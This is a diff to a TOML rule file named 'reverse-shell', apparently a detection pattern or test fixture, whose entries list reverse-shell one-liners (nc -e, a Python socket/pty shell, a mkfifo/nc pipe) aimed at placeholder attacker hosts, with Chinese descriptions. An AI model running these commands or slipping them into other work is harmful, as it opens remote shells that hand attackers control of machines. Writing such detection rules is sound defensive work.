@@ -1,11 +1,15 @@
 examples = []
 [[hit]]
 command = "nc -e /bin/bash <hacker host> <port>"
-description = "nc 反弹 shell"
+description = "nc 反弹 shell 出去；一般对方用 `nc -nvlp <port>` 先监听"
 
 [[hit]]
-command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<hacker host>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(/bin/bash)'"
+command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<host>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
 description = "python3 反弹 shell"
+
+[[hit]]
+command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <host> <port> > /tmp/f"
+description = "通过 FIFO 管道反弹 shell"
 
 [meta]
 name = "reverse-shell"
